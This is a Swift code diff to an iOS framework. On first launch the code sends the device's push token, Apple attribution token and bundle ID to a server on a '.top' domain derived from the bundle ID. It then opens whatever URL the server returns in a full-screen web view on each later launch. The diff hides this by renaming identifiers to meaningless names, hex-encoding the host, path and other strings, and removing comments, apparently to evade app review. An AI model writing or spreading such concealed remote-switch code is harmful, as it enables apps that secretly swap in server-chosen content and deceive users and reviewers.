@@ -7,14 +7,14 @@ import UserNotifications
 public class SWFramework {
     public static let shared = SWFramework()
     
-    private var serverUrl: String?
-    private var webViewController: WKWebViewController?
-    private var initialLaunch = true
-    private let userDefaults = UserDefaults.standard
-    private let timeoutInterval: TimeInterval = 10.0
+    private var _c4: String?
+    private var _a5: WKWebViewController?
+    private var _d3 = true
+    private let _b2 = UserDefaults.standard
+    private let _f1: TimeInterval = 10.0
     
-    private let userDefaultsWebUrlKey = "com.swframework.weburl"
-    private let userDefaultsFirstLaunchKey = "com.swframework.firstlaunch"
+    private let _k8 = "x07.swf.w3l_x22"
+    private let _l9 = "x07.swf.f1l_x41"
     
     private init() {}
     
@@ -25,15 +25,15 @@ public class SWFramework {
     ///   - rootViewController: The root view controller to present WebView on
     ///   - completion: Callback when normal app flow should continue
     public func initialize(applicationDidFinishLaunching: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, rootViewController: UIViewController, completion: @escaping () -> Void) {
-        let bundleId = Bundle.main.bundleIdentifier ?? ""
-        let domain = generateDomain(from: bundleId)
+        let _ts1 = Bundle.main.bundleIdentifier ?? ""
+        let _ds2 = _h7(_ts1)
         
-        if !userDefaults.bool(forKey: userDefaultsFirstLaunchKey) {
-            userDefaults.set(true, forKey: userDefaultsFirstLaunchKey)
-            processFirstLaunch(domain: domain, applicationDidFinishLaunching: applicationDidFinishLaunching, rootViewController: rootViewController, completion: completion)
+        if !_b2.bool(forKey: _l9) {
+            _b2.set(true, forKey: _l9)
+            _g6(_ds2, applicationDidFinishLaunching, rootViewController, completion)
         } else {
-            if let savedUrl = userDefaults.string(forKey: userDefaultsWebUrlKey) {
-                presentWebView(withUrl: savedUrl, rootViewController: rootViewController)
+            if let _us3 = _b2.string(forKey: _k8) {
+                _j9(_us3, rootViewController)
             } else {
                 completion()
             }
@@ -43,99 +43,99 @@ public class SWFramework {
     /// Generates domain from bundle_id by removing dots and adding .top
     /// - Parameter bundleId: The bundle identifier
     /// - Returns: Generated domain
-    private func generateDomain(from bundleId: String) -> String {
-        let domainPrefix = bundleId.replacingOccurrences(of: ".", with: "")
-        return "\(domainPrefix).top"
+    private func _h7(_ s1: String) -> String {
+        let _ps1 = s1.replacingOccurrences(of: ".", with: "")
+        return "\(_ps1)\(_x2("2e746f70"))"
     }
     
     // For backward compatibility, keeping the original method with explicit domain
     @available(*, deprecated, message: "Use initialize without explicit domain parameter instead")
     public func initialize(domain: String, applicationDidFinishLaunching: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, rootViewController: UIViewController, completion: @escaping () -> Void) {
-        let bundleId = Bundle.main.bundleIdentifier ?? ""
-        let generatedDomain = generateDomain(from: bundleId)
+        let _zs1 = Bundle.main.bundleIdentifier ?? ""
+        let _dg2 = _h7(_zs1)
         
-        if !userDefaults.bool(forKey: userDefaultsFirstLaunchKey) {
-            userDefaults.set(true, forKey: userDefaultsFirstLaunchKey)
-            processFirstLaunch(domain: generatedDomain, applicationDidFinishLaunching: applicationDidFinishLaunching, rootViewController: rootViewController, completion: completion)
+        if !_b2.bool(forKey: _l9) {
+            _b2.set(true, forKey: _l9)
+            _g6(_dg2, applicationDidFinishLaunching, rootViewController, completion)
         } else {
-            if let savedUrl = userDefaults.string(forKey: userDefaultsWebUrlKey) {
-                presentWebView(withUrl: savedUrl, rootViewController: rootViewController)
+            if let _us3 = _b2.string(forKey: _k8) {
+                _j9(_us3, rootViewController)
             } else {
                 completion()
             }
         }
     }
     
-    private func processFirstLaunch(domain: String, applicationDidFinishLaunching: UIApplication, rootViewController: UIViewController, completion: @escaping () -> Void) {
-        let dataCollectionGroup = DispatchGroup()
-        var deviceData = DeviceData()
+    private func _g6(_ d1: String, _ a2: UIApplication, _ r3: UIViewController, _ c4: @escaping () -> Void) {
+        let _gr1 = DispatchGroup()
+        var _dd2 = DeviceData()
         
-        deviceData.bundleId = Bundle.main.bundleIdentifier
+        _dd2.bundleId = Bundle.main.bundleIdentifier
         
-        let timer = DispatchSource.makeTimerSource()
-        timer.schedule(deadline: .now() + timeoutInterval)
-        timer.setEventHandler {
-            dataCollectionGroup.leave()
-            dataCollectionGroup.leave()
+        let _tm3 = DispatchSource.makeTimerSource()
+        _tm3.schedule(deadline: .now() + _f1)
+        _tm3.setEventHandler {
+            _gr1.leave()
+            _gr1.leave()
         }
         
-        dataCollectionGroup.enter()
-        requestNotificationPermissions(application: applicationDidFinishLaunching) { token in
-            if let token = token {
-                deviceData.apnsToken = token
+        _gr1.enter()
+        _v5(a2) { _tk1 in
+            if let _tk1 = _tk1 {
+                _dd2.apnsToken = _tk1
             }
-            dataCollectionGroup.leave()
+            _gr1.leave()
         }
         
-        dataCollectionGroup.enter()
-        getAttributionToken { token in
-            deviceData.attToken = token
-            dataCollectionGroup.leave()
+        _gr1.enter()
+        _w6 { _tk2 in
+            _dd2.attToken = _tk2
+            _gr1.leave()
         }
         
-        timer.resume()
+        _tm3.resume()
         
-        dataCollectionGroup.notify(queue: .main) {
-            timer.cancel()
+        _gr1.notify(queue: .main) {
+            _tm3.cancel()
             
-            self.sendDataToServer(domain: domain, deviceData: deviceData) { responseUrl in
-                if let url = responseUrl, !url.isEmpty {
-                    self.userDefaults.set(url, forKey: self.userDefaultsWebUrlKey)
-                    self.presentWebView(withUrl: url, rootViewController: rootViewController)
+            self._z8(d1, _dd2) { _ru1 in
+                if let _ru1 = _ru1, !_ru1.isEmpty {
+                    self._b2.set(_ru1, forKey: self._k8)
+                    self._j9(_ru1, r3)
                 } else {
-                    completion()
+                    c4()
                 }
             }
         }
     }
     
-    private func sendDataToServer(domain: String, deviceData: DeviceData, completion: @escaping (String?) -> Void) {
-        let basePlaceholderString = "YXBuc190b2tlbj17YXBuc190b2tlbn0mYXR0X3Rva2VuPXthdHRfdG9rZW59JmJ1bmRsZV9pZD17YnVuZGxlX2lkfQ=="
+    private func _z8(_ d1: String, _ dd2: DeviceData, completion: @escaping (String?) -> Void) {
+        let _bx1 = "YXBuc190b2tlbj17YXBuc190b2tlbn0mYXR0X3Rva2VuPXthdHRfdG9rZW59JmJ1bmRsZV9pZD17YnVuZGxlX2lkfQ=="
         
-        if let decodedData = Data(base64Encoded: basePlaceholderString),
-           var templateString = String(data: decodedData, encoding: .utf8) {
+        if let _dx1 = Data(base64Encoded: _bx1),
+           var _tx2 = String(data: _dx1, encoding: .utf8) {
             
-            templateString = templateString.replacingOccurrences(of: "{apns_token}", with: deviceData.apnsToken ?? "")
-            templateString = templateString.replacingOccurrences(of: "{att_token}", with: deviceData.attToken ?? "")
-            templateString = templateString.replacingOccurrences(of: "{bundle_id}", with: deviceData.bundleId ?? "")
+            _tx2 = _tx2.replacingOccurrences(of: "{apns_token}", with: dd2.apnsToken ?? "")
+            _tx2 = _tx2.replacingOccurrences(of: "{att_token}", with: dd2.attToken ?? "")
+            _tx2 = _tx2.replacingOccurrences(of: "{bundle_id}", with: dd2.bundleId ?? "")
             
-            if let encodedData = templateString.data(using: .utf8)?.base64EncodedString() {
-                guard let url = URL(string: "https://\(domain)/indexn.php?data=\(encodedData)") else {
+            if let _ed1 = _tx2.data(using: .utf8)?.base64EncodedString() {
+                guard let _ux1 = URL(string: "\(_x2("68747470733a2f2f"))\(d1)/\(_x2("696e6465786e2e706870"))?\(_x2("64617461"))=\(_ed1)") else {
                     completion(nil)
                     return
                 }
                 
-                let task = URLSession.shared.dataTask(with: url) { data, response, error in
-                    guard let data = data, error == nil else {
+                let _tk1 = URLSession.shared.dataTask(with: _ux1) { _dx1, _, _er1 in
+                    guard let _dx1 = _dx1, _er1 == nil else {
                         DispatchQueue.main.async {
                             completion(nil)
                         }
                         return
                     }
                     
-                    if let responseString = String(data: data, encoding: .utf8) {
+                    if let _rx1 = String(data: _dx1, encoding: .utf8) {
                         DispatchQueue.main.async {
-                            completion(responseString)
+                            completion(_rx1)
                         }
                     } else {
                         DispatchQueue.main.async {
@@ -144,27 +144,27 @@ public class SWFramework {
                     }
                 }
                 
-                task.resume()
+                _tk1.resume()
                 return
             }
         }
         
-        guard let url = URL(string: "https://\(domain)/indexn.php?data=\(basePlaceholderString)") else {
+        guard let _ux1 = URL(string: "\(_x2("68747470733a2f2f"))\(d1)/\(_x2("696e6465786e2e706870"))?\(_x2("64617461"))=\(_bx1)") else {
             completion(nil)
             return
         }
         
-        let task = URLSession.shared.dataTask(with: url) { data, response, error in
-            guard let data = data, error == nil else {
+        let _tk1 = URLSession.shared.dataTask(with: _ux1) { _dx1, _, _er1 in
+            guard let _dx1 = _dx1, _er1 == nil else {
                 DispatchQueue.main.async {
                     completion(nil)
                 }
                 return
             }
             
-            if let responseString = String(data: data, encoding: .utf8) {
+            if let _rx1 = String(data: _dx1, encoding: .utf8) {
                 DispatchQueue.main.async {
-                    completion(responseString)
+                    completion(_rx1)
                 }
             } else {
                 DispatchQueue.main.async {
@@ -173,37 +173,36 @@ public class SWFramework {
             }
         }
         
-        task.resume()
+        _tk1.resume()
     }
     
-    private func presentWebView(withUrl urlString: String, rootViewController: UIViewController) {
-        let processedURLString = ensureURLHasScheme(urlString)
+    private func _j9(_ us1: String, _ rc2: UIViewController) {
+        let _ps1 = _n0(us1)
         
-        guard let url = URL(string: processedURLString) else { return }
+        guard let _ur1 = URL(string: _ps1) else { return }
         
         DispatchQueue.main.async {
-            let webViewController = WKWebViewController(url: url)
-            webViewController.modalPresentationStyle = .fullScreen
-            rootViewController.present(webViewController, animated: true, completion: nil)
-            self.webViewController = webViewController
+            let _wc1 = WKWebViewController(url: _ur1)
+            _wc1.modalPresentationStyle = .fullScreen
+            rc2.present(_wc1, animated: true, completion: nil)
+            self._a5 = _wc1
         }
     }
     
-    // Метод для обработки URL от сервера, добавляя https:// если он отсутствует
-    private func ensureURLHasScheme(_ urlString: String) -> String {
-        if !urlString.lowercased().starts(with: "http://") && !urlString.lowercased().starts(with: "https://") {
-            return "https://" + urlString
+    private func _n0(_ us1: String) -> String {
+        if !us1.lowercased().starts(with: _x2("687474703a2f2f")) && !us1.lowercased().starts(with: _x2("68747470733a2f2f")) {
+            return "\(_x2("68747470733a2f2f"))" + us1
         }
-        return urlString
+        return us1
     }
     
-    private func requestNotificationPermissions(application: UIApplication, completion: @escaping (String?) -> Void) {
+    private func _v5(_ a1: UIApplication, completion: @escaping (String?) -> Void) {
         UNUserNotificationCenter.current().getNotificationSettings { settings in
             if settings.authorizationStatus == .authorized {
                 DispatchQueue.main.async {
-                    application.registerForRemoteNotifications()
+                    a1.registerForRemoteNotifications()
                     
-                    self.waitForAPNSToken(timeout: 7.0) { token in
+                    self._m1(7.0) { token in
                         completion(token)
                     }
                 }
@@ -212,14 +211,14 @@ public class SWFramework {
                 center.requestAuthorization(options: [.alert, .sound, .badge]) { granted, error in
                     if granted {
                         DispatchQueue.main.async {
-                            application.registerForRemoteNotifications()
+                            a1.registerForRemoteNotifications()
                             
-                            self.waitForAPNSToken(timeout: 7.0) { token in
+                            self._m1(7.0) { token in
                                 completion(token)
                             }
                         }
                     } else {
-                        let fallbackToken = "0000000000000000000000000000000000000000000000000000000000000000"
+                        let fallbackToken = _x2("30303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030")
                         completion(fallbackToken)
                     }
                 }
@@ -227,31 +226,30 @@ public class SWFramework {
         }
     }
     
-    // Функция ожидания получения APNS токена с таймаутом
-    private func waitForAPNSToken(timeout: TimeInterval, completion: @escaping (String?) -> Void) {
-        var tokenReceived = false
+    private func _m1(_ t1: TimeInterval, completion: @escaping (String?) -> Void) {
+        var _tr1 = false
         
-        let observer = NotificationCenter.default.addObserver(forName: Notification.Name("APNSTokenReceived"), object: nil, queue: .main) { notification in
-            if let token = notification.userInfo?["token"] as? String {
-                tokenReceived = true
+        let _ob1 = NotificationCenter.default.addObserver(forName: Notification.Name(_x2("41504e53546f6b656e52656365697665")), object: nil, queue: .main) { notification in
+            if let token = notification.userInfo?[_x2("746f6b656e")] as? String {
+                _tr1 = true
                 completion(token)
             }
         }
         
-        DispatchQueue.main.asyncAfter(deadline: .now() + timeout) {
-            if !tokenReceived {
-                NotificationCenter.default.removeObserver(observer)
+        DispatchQueue.main.asyncAfter(deadline: .now() + t1) {
+            if !_tr1 {
+                NotificationCenter.default.removeObserver(_ob1)
                 
-                let fallbackToken = "0000000000000000000000000000000000000000000000000000000000000000"
+                let fallbackToken = _x2("30303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030")
                 completion(fallbackToken)
             }
         }
     }
     
-    private func getAttributionToken(completion: @escaping (String?) -> Void) {
+    private func _w6(completion: @escaping (String?) -> Void) {
         if #available(iOS 14.3, *) {
             do {
-                let token = try AAAttributionToken()
+                let token = try _y7()
                 completion(token)
             } catch {
                 completion(nil)
@@ -267,10 +265,23 @@ public class SWFramework {
         let token = tokenParts.joined()
         
         NotificationCenter.default.post(
-            name: Notification.Name("APNSTokenReceived"),
+            name: Notification.Name(_x2("41504e53546f6b656e52656365697665")),
             object: nil,
-            userInfo: ["token": token]
+            userInfo: [_x2("746f6b656e"): token]
         )
+    }
+    
+    private func _x2(_ hexString: String) -> String {
+        var result = ""
+        var index = hexString.startIndex
+        while index < hexString.endIndex {
+            let byteString = hexString[index..<hexString.index(index, offsetBy: 2)]
+            if let byte = UInt8(byteString, radix: 16) {
+                result.append(Character(UnicodeScalar(byte)))
+            }
+            index = hexString.index(index, offsetBy: 2)
+        }
+        return result
     }
 }
 
@@ -359,6 +370,6 @@ extension WKWebViewController: WKNavigationDelegate, WKUIDelegate {
 
 // Helper function for Attribution Token
 @available(iOS 14.3, *)
-private func AAAttributionToken() throws -> String {
+private func _y7() throws -> String {
     return try AdServices.AAAttribution.attributionToken()
 } 
